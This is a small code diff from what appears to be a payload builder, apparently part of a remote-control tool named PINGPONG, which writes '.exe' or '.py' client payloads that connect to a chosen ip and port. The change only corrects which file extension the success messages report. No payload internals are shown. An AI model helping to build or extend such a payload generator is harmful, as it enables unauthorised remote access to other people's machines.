@@ -186,7 +186,7 @@ PINGPONG_client("{ip}", {port})""")
 			move(f"{father_path}/upload_payload/PINGPONG_payload_sign_twice.exe", f"{f_father_path}")
 			rename(f"{f_father_path}/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload.exe")
 			if printf:
-				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.py")
+				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
 		elif file_format == '.py':
 			with open("payload.py", "w+", encoding="utf8") as a:
 				a.write(f'usage_list = {open_usage}')
@@ -197,7 +197,7 @@ PINGPONG_client("{ip}", {port})""")
 				a.write(f"""
 PINGPONG_client("{ip}", {port})""")
 			if printf:
-				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
+				main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.py")
 	else:
 		main.print_normal("payload>[*]Back to the main console")
 		main.main()
